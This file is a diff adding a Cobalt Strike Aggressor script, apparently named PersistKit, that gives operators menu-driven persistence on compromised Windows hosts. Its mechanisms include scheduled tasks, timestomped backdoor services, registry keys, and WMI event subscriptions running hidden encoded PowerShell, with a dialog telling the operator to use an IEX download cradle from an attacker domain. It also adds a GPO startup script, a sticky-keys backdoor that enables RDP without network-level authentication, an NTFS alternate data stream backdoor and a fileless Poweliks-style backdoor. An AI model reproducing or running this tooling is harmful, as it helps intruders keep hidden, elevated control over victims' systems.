@@ -1,0 +1,440 @@
+
+sub persistUserSchtasks  {
+	$bid = $1;
+	$dialog = dialog("User Schtasks Persistence", %(taskname => "Evil Task Name..", targetpath => "Target Path..", user => "User to Run as..", schedule => "Schedule modifier..", payloadfile => "Select DLL Payload.."), lambda({
+		if ("$3['taskname']" ismatch 'Evil Task Name..' || "$3['targetpath']" ismatch 'Target Path..' || "$3['payloadfile']" ismatch 'Select DLL Payload..' || "$3['user']" ismatch 'User to Run as..' || "$3['schedule']" ismatch 'Schedule modifier..') {
+			berror($bid, "\c4Please enter a valid Task Name, Target Path, and a valid Payload File.");
+			break;
+		}
+		else {
+			bcd($bid, $3['targetpath']);
+			bupload($bid, $3['payloadfile']);
+			bshell($bid, 'schtasks /create /tn "'.$3['taskname'].'" /tr "C:\Windows\System32\rundll32.exe '.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].',StartW" /ru "'.$3['user'].'" /sc "'.$3['schedule'].'"');
+			bshell($bid, 'schtasks /query /v /tn "'.$3['taskname'].'" /FO list');
+		}
+	}));
+
+	dialog_description($dialog, "User Schtasks Persistence - Generates a schtask for persistence on selected beacon.");
+	
+	drow_text($dialog, "taskname",  "Schtasks Taskname:");
+	drow_text($dialog, "user", "User to Run as:");
+	drow_text($dialog, "targetpath", "Target Path:");
+	drow_text($dialog, "schedule", "Schedule Modifier:");
+	drow_file($dialog, "payloadfile", "DLL Payload:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+#Admin Level Custom Service EXE Persistence
+#Author: @r3dQu1nn
+#Runs as elevated user/SYSTEM for the selected beacon
+
+sub persistCustomService {
+	$bid = $1;
+	$dialog = dialog("Admin Level Custom Service EXE Persistence", %(servicename => "Custom Service Name..", display => "Display Name for Custom Service..", description => "Description for Custom Service..", targetpath => "Target Path..", payloadfile => "Select Payload.."), lambda({
+		if ("$3['servicename']" ismatch 'Custom Service Name..' || "$3['targetpath']" ismatch 'Target Path..' || "$3['display']" ismatch 'Display Name for Custom Service..' || "$3['description']" ismatch 'Description for Custom Service..' || "$3['payloadfile']" ismatch 'Select Payload..') {
+			berror($bid, "\c4Please enter a valid Custom Service Name, Target Path, Display Name, Description and Payload File.");
+			break;
+		}
+		else {
+			bcd($bid, $3['targetpath']);
+			bupload($bid, $3['payloadfile']);
+			btimestomp($bid, "$3['payloadfile']", "C:\\Windows\\System32\\cmd.exe");
+			bshell($bid, 'sc delete '.$3['servicename'].'');
+			bshell($bid, 'sc create '.$3['servicename'].' binpath= "'.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].'" error= ignore start= auto DisplayName= "'.$3['display'].'"');
+			bshell($bid, 'sc description '.$3['servicename'].' "'.$3['description'].'"');
+			bshell($bid, 'sc start '.$3['servicename'].'');
+		}
+	}));
+	dialog_description($dialog, "Generates a Custom Service for Admin Level persistence on selected beacon. **Only Service EXE Payloads should be used**");
+	
+	drow_text($dialog, "servicename",  "Custom Service Name:");
+	drow_text($dialog, "display", "Display Name for Custom Service:");
+	drow_text($dialog, "description", "Description for Custom Service:");
+	drow_text($dialog, "targetpath", "Target/Bin Path:");
+	drow_file($dialog, "payloadfile", "Payload:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+#Registry Persistence
+#Author: @r3dQu1nn
+#Depending on Registry Location elevated access might be required
+
+sub persistRegistry {
+	$bid = $1;
+	$dialog = dialog("Registry Persistence", %(reglocation => "Registry Location..", keyname => "Key Name..", datatype => "Data Type..(REG_SZ)", keyvalue => "Key Value..(Payload)"), lambda({
+		if ("$3['reglocation']" ismatch 'Registry Location..' || "$3['keyname']" ismatch 'Key Name..' || "$3['datatype']" ismatch 'Data Type..(REG_SZ)' || "$3['keyvalue']" ismatch 'Key Value..(Payload)') {
+			berror($bid, "\c4Please enter a valid Registry Location, Key Name, Key Type, and a valid Payload Location.");
+			break;
+		}
+		else {
+			bshell($bid, 'reg add "'.$3['reglocation'].'" /v "'.$3['keyname'].'" /t "'.$3['datatype'].'" /d "'.$3['keyvalue'].'" /f');
+			bshell($bid, 'reg query "'.$3['reglocation'].'"');
+		}
+	}));
+
+	dialog_description($dialog, "Registry Persistence - Creates a custom Registry Entry for persistence on selected beacon. **HKLM\\ could require elevated access.");
+	
+	drow_text($dialog, "reglocation",  "Registry Location:");
+	drow_text($dialog, "keyname", "Registry Key Name:");
+	drow_text($dialog, "datatype", "Registry Key Type:");
+	drow_text($dialog, "keyvalue", "Registry Key Value..(Payload Location):");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+#Permanent WMI Event using WMIC Persistence
+#Author: @r3dQu1nn
+#Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon
+#Very syntax heavy, Test first before using on live targets
+
+sub persistwmieventwmic {
+	$bid = $1;
+	$dialog = dialog("Permanent WMI Event using WMIC Persistence", %(eventfilter => "__EventFilter Name..", eventquery => "Event Query...(Win32 Classes)", eventconsumer => "CommandLineEventConsumer Name..(Must be different from __EventFilter Name)", commandline => "CommandLineTemplate Syntax..(powershell.exe -w hidden -enc)", payloadfile => "Encoded Payload String.."), lambda({
+		if ("$3['eventfilter']" ismatch '__EventFilter Name..' || "$3['eventquery']" ismatch 'Event Query...(Win32 Classes)' || "$3['eventconsumer']" ismatch 'CommandLineEventConsumer Name..(Must be different from __EventFilter Name)' || "$3['commandline']" ismatch 'CommandLineTemplate Syntax..(powershell.exe -w hidden)' || "$3['payloadfile']" ismatch 'Select Encoded Payload..') {
+			berror($bid, "\c4Please enter a valid Custom __EventFilter Name, Event Query, CommandLineEventConsumer Name, Command Line Options, and the Encoded Payload File.");
+			break;
+		}
+		else {
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter CREATE Name="'.$3['eventfilter'].'", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="'.$3['eventquery'].'"');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer CREATE Name="'.$3['eventconsumer'].'", CommandLineTemplate="'.$3['commandline']." ".split("/",$3['payloadfile'])[-1].'"');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"'.$3['eventfilter'].'\"", Consumer="CommandLineEventConsumer.Name=\"'.$3['eventconsumer'].'\""');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list');
+		}
+	}));
+	dialog_description($dialog, "Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload must include IEX ((new-object new.webclient).downloadstring(http://yourdomain/payload.txt)) Utilize the following command to encode the payload correctly: cat payload.txt | iconv --to-code=UTF-16LE | base64** ");
+	
+	#base 64 encode IEX of the powershell one liner
+	#cat payload.txt | iconv --to-code=UTF-16LE | base64
+	
+	drow_text($dialog, "eventfilter",  "Custom __EventFilter Name:");
+	drow_text($dialog, "eventquery", "Custom Event Query:");
+	drow_text($dialog, "eventconsumer", "Custom CommandLineEventConsumer Name:");
+	drow_text($dialog, "commandline", "Custom Command Line Options:");
+	drow_text($dialog, "payloadfile", "Custom Encoded Payload String:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+#Permanent WMI Event using PowerShell Persistence
+#Author: @r3dQu1nn
+#Generates a Custom WMI Event using PowerShell for SYSTEM Level persistence on selected beacon
+#Very syntax heavy, Test first before using on live targets
+
+sub persistwmievent  {
+	$bid = $1;
+	if (-is64 $bid) {
+		$ExePath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -enc";
+	}
+	else {
+		$ExePath = "C:\\Windows\\powershell.exe -nop -w hidden -enc";
+	}
+
+	$dialog = dialog("Permanent WMI Event Persistence with PowerShell", %(eventfilter => "__EventFilter Name..", eventquery => "Event Query...(Win32 Classes)", payloadstring => "Encoded Payload String.."), lambda({
+		if ("$3['eventfilter']" ismatch '__EventFilter Name..' || "$3['eventquery']" ismatch 'Event Query...(Win32 Classes)' || "$3['payloadstring']" ismatch 'Encoded Payload String..') {
+			berror($bid, "\c4Please enter a valid __EventFilter Name, Event Query, and an Encoded Payload String.");
+			break;
+		}
+		else {
+			$powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name=\"".$3['eventfilter']."\";EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"".$3['eventquery']."\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name=\"".$3['eventfilter']."\";CommandLineTemplate =\"". $ExePath ." ".$3['payloadstring']."\"};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
+			bpowershell!($bid, $powershellcmd);
+			blog($bid, 'Permanently Storing '.$3['eventfilter'].' in root\CimV2..');
+			bpowershell($bid, 'Get-WmiObject __eventFilter -namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
+			bpowershell($bid, 'Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
+		}
+	}));
+	dialog_description($dialog, "Generates a Custom WMI Event using PowerShell for SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload String must be converted to UTF-16LE, base64 encoded and under 1MB.**");
+	
+	drow_text($dialog, "eventfilter",  "Custom __EventFilter Name:");
+	drow_text($dialog, "eventquery", "Custom Event Query:");
+	drow_text($dialog, "payloadstring", "Custom Encoded Payload String:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+}
+
+#Startup Script Local GPO Persistence
+#Author: @r3dQu1nn
+#Generates a Local GPO Entry in psscripts.ini to call a .ps1 script file for persistence on selected beacon 
+#Calls back as SYSTEM 
+#**Check permissions with GPO Enumeration (Successful GroupPolicy Directory Listing) first before executing**
+#**Beacon execution will cause winlogon.exe to hang and the end user can't login. Once the new beacon checks in inject into another process and kill the original. Update to come out soon.**
+#https://cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/
+
+sub persistStartupGPO  {
+
+	$bid = $1;
+	$dialog = dialog("Startup Script Local GPO Persistence", %(scriptfile => "Select PS1 Script File.."), lambda({
+		if ("$3['scriptfile']" ismatch 'Select PS1 Script File..') {
+			berror($bid, "\c4Please enter a valid Script Path, and .ps1 Script File.");
+			break;
+		}
+		else {
+			bcd($bid, "C:\\");
+			bupload($bid, $3['scriptfile']);
+			$handle = openf(">psscripts.ini");
+			writeb($handle, "[ScriptsConfig]\nStartExecutePSFirst=true\n[Startup]\n0CmdLine=".split("/",$3['scriptfile'])[-1]."\n0Parameters=");
+			closef($handle);
+			bpowershell($bid, 'Move-Item -force -path C:\\'.split("/",$3['scriptfile'])[-1].' -destination C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup\\');
+			bupload($bid, script_resource("psscripts.ini"));
+			bpowershell($bid, 'Remove-Item -Force C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\psscripts.ini');
+			bpowershell($bid, 'Move-Item -force -path C:\\psscripts.ini -destination C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\');
+			bshell($bid, 'gpupdate /force');
+		}
+	}));
+
+	dialog_description($dialog, "Startup Script Local GPO Persistence - Generates a Local GPO Entry in psscripts.ini to call a .ps1 script file for persistence on selected beacon. **Check permissions with GPO Enumeration (Successful GroupPolicy Directory Listing) first before executing**");
+	
+	drow_file($dialog, "scriptfile", ".ps1 Script File:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+sub stickykeys {
+
+	bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
+	bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"');
+	bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d "0" /f');
+	bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');
+	bshell($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
+	bshell($1, 'net start TermService');
+
+}
+
+sub persistThroughStartUpFolder {
+	$bid = $1;
+	$dialog = dialog("Start Up Folder Persistence", %(startup => "Startup Directory Folder..", payload => "Select Payload.."), lambda({
+		if ("$3['startup']" ismatch 'Startup Directory Folder..' || "$3['payload']" ismatch 'Select Payload..') {
+			berror($bid, "\c4Please enter a valid Startup Directory Folder, and select a Payload")
+			break;
+		}
+		else {
+			bshell($bid, 'cd "'.$3['startup'].'"');
+			bupload($bid, $3['payload']);
+			btimestomp($bid, "$3['payload']", "c:\\windows\\system32\\calc.exe");	
+		}
+	}));
+	dialog_description($dialog, "Start Up Folder Persistence - Generates a Startup Folder Entry and places a payload inside that folder. **Windows NT 6.0-10.0/All Users Location - %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup | Windows NT 6.0-10.0/Current User Location %SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
+
+	drow_text($dialog, "startup", "StartUp Directory Folder Location:");
+	drow_text($dialog, "payload", "Select Payload:");
+
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+}
+
+
+
+
+
+
+
+
+# Used for "Create Backdoor Service" action
+sub servicefilename {
+	$servicebackdoorfilename = matches($1, '[\/](\w+\.\w+)$');
+	$servicebackdoorfilename = $servicebackdoorfilename[0];
+	return $servicebackdoorfilename;
+}
+
+# Menu-driven operation to create an NTFS Alternate Data Stream backdoor that
+# 	autoruns on boot. Does NOT require admin
+sub createADSBackdoor {
+	$bid = $1;
+	$selectedListener = $2;
+	getADSRegName();
+	bpowershell_import($bid, script_resource("scripts/Invoke-ADSBackdoor.ps1"));
+	prompt_text("Location of file/folder to give ADS (it must exist!)?", "%APPDATA%\\Temp\\somefile.txt", {
+		# Encode shellcode for the stager
+		$psPayload = powershell_encode_stager(shellcode($selectedListener));
+		$fullPsPayload = "powershell.exe -nop -w hidden -encodedcommand $psPayload";
+		binput($bid, "powershell-import Invoke-ADSBackdoor.ps1");
+		# $bid is actually an array, so use $bid[0] for -isadmin
+		# Admitettly hacky way to avoid using lambda
+		if (-isadmin $bid[0]){
+			blog($bid, "Beacon is admin, using HKLM hive, \Ubackdoor will execute for any user\U");
+			binput($bid, "powershell Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path $1 -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \" -admin");
+			bpowershell($bid, "Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \" -admin");
+		} else {
+			blog($bid, "Beacon is not admin, using HKCU hive, \Ubackdoor will only execute for this user\U");
+			binput($bid, "powershell Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path $1 -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \"");
+			bpowershell($bid, "Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \"");
+		}
+	});
+}
+
+sub createFilelessBackdoor{
+	$bid = $1;
+	$selectedListener = $2;
+	openOrActivate($bid);
+	$psPayload = powershell_encode_stager(shellcode($selectedListener));
+	binput($bid, "powershell-import Persist-Poweliks.ps1");
+	bpowershell_import($bid, script_resource("scripts/Persist-Poweliks.ps1"));
+	binput($bid, "powershell Persist-Poweliks");
+	bpowershell($bid, "Persist-Poweliks -cobaltstrike_gen_payload \" $+ $psPayload $+ \"");
+}
+
+# Returns a string to use for the reg key name
+sub getADSRegName {
+	prompt_text("Registry key name you'd like to use?", "Update", {
+		$theADSRegName = $1;
+	});
+	return $theADSRegName;
+}
+
+popup beacon_bottom {
+	menu "PersistKit" {
+		item "Create Backdoor Service"{
+			local ('$bid');
+			# TODO:
+			#	* build out a proper Java Swing menu to customize the options
+			foreach $bid ($1){
+				prompt_file_open("Select the service exe to use", $null, false, {
+					blog($bid, "\c4Uploading backdoor on beacon $1 using file $2");
+					blog($bid, "Attempting to publish backdoor service");
+					bcd($bid, "C:\\Windows\\");
+					blog($bid, "\c4Changed directory on beacon $1 to C:\\Windows\\");
+					bupload($bid, $2);
+					servicefilename($2);
+					btimestomp($bid, "$servicebackdoorfilename", "C:\\Windows\\system32\\cmd.exe")
+					prompt_text("Name of service to use?", "GenericPrinterDriver", {
+						$serviceName = $1;
+					});
+					prompt_text("Service Display Name to use?", "Generic Printer Driver Support", {
+						$serviceDisplayName = $1;
+					});
+					bshell($bid, "sc create $serviceName binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \" $serviceDisplayName \"");
+					bshell($bid, "sc start $serviceName ");
+					blog($bid, "Backdoor service created using $servicebackdoorfilename ");
+					blog($bid, "\c9[+] Backdoor creation complete!");
+				});
+			}
+		}
+		item "Create NTFS ADS Backdoor"{
+				local ('$bid');
+				# Open a payload selection dialoge, passes it to createADSBackdoor()
+				# TODO:
+				#	* build out a proper Java Swing menu to customize the options
+				#	* Modify the powershell script to determine which key to write to HKLM || HKCU
+				foreach $bid ($1){
+					openPayloadHelper(lambda({
+					createADSBackdoor($bid, $1);
+				}, $bid => $1));
+			}
+		}
+
+
+
+		item "&Schtasks Persistence" {
+				local('$bid');
+				foreach $bid ($1) {
+					persistUserSchtasks($bid);
+				}
+			}
+			item "&Service EXE Persistence" {
+				local('$bid');
+				foreach $bid ($1) {
+					if (-isadmin $bid) {
+						persistCustomService($bid);
+					}
+					else {
+						berror($1, "\c4Persistence Requires Admin Level Privileges");
+					}
+				}
+			}
+			item "&Registry Persistence" {
+				local('$bid');
+				foreach $bid ($1) {
+					persistRegistry($bid);
+				}
+			}
+			item "&WMI Event Persistence using PowerShell" {
+				local('$bid');
+				foreach $bid ($1) {
+					if (-isadmin $bid) {
+						persistwmievent($bid);
+					}
+					else {
+						berror($1, "\c4Persistence Requires Admin Level Privileges");
+					}	
+				}
+			}
+			item "&WMI Event Persistence using WMIC" {
+				local('$bid');
+				foreach $bid ($1) {
+					if (-isadmin $bid) {
+						persistwmieventwmic($bid);
+					}
+					else {
+						berror($1, "\c4Persistence Requires Admin Level Privileges");
+					}
+				}
+			}
+			item "&Startup Script Local GPO Persistence" {
+				local('$bid');
+				foreach $bid ($1) {
+					if (-isadmin $bid) {
+						persistStartupGPO($bid);
+					}
+					else {
+						berror($1, "\c4Persistence Requires Admin Level Privileges");
+					}
+				}
+			}
+			item "&Stickykeys(OSK) BackDoor Persistence (Need RDP Open)" {
+				local('$bid');
+				foreach $bid ($1) {
+					stickykeys($bid);
+				}
+			}	
+			item "&Windows Startup Persistence"{
+				local('$bid');
+				foreach $bid ($1) {
+					persistThroughStartUpFolder($bid);
+				}
+			}
+		
+
+		menu "Fileless backdoor" {
+			item "Create fileless backdoor"{
+				local('$bid');
+				foreach $bid ($1){
+					openPayloadHelper(lambda({
+						createFilelessBackdoor($bid, $1);
+						}, $bid => $1));
+				}
+			}
+			item "Check for fileless backdoor"{
+				local('$bid');
+				foreach $bid ($1){
+					bpowershell_import($bid, script_resource("scripts/Persist-Poweliks.ps1"));
+					bpowershell($bid, "Test-Poweliks");
+				}
+			}
+			item "Remove fileless backdoor"{
+				local('$bid');
+				foreach $bid ($1){
+					bpowershell_import($bid, script_resource("scripts/Persist-Poweliks.ps1"));
+					bpowershell($bid, "Remove-Poweliks");
+				}
+			}
+		}
+
+
+
+
+	}
+}
